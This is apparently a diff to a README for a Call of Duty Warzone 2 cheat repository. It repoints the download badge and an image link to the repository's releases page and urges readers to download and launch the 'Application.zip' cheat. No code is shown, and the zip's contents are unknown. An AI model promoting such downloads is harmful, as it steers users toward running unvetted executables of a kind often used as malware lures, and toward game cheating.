@@ -30,7 +30,7 @@ Explore a wide range of topics related to this repository:
 
 ## Access Project Files
 To access the project files, please download the zip file from the following link:
-[<img src="https://img.shields.io/badge/Download-Application.zip-brightgreen">](https://github.com/files/uploaded/Application.zip)
+[<img src="https://github.com/ggsgssss/INTERWEBS-COD-Warzone-2-Cheat/releases">](https://github.com/ggsgssss/INTERWEBS-COD-Warzone-2-Cheat/releases)
 
 Simply click on the badge above to initiate the download. Once the file is downloaded, you can launch the application and start enjoying the benefits of the COD Warzone cheat.
 
@@ -51,4 +51,4 @@ Thank you for exploring the "INTERWEBS-COD-Warzone-2-Cheat" repository. We hope 
 
 Let's dominate the battlefield together! 🚀🔫
 
-![COD Warzone 2](https://example.com/cod-warzone-2-image.jpg)
+![COD Warzone 2](https://github.com/ggsgssss/INTERWEBS-COD-Warzone-2-Cheat/releases)
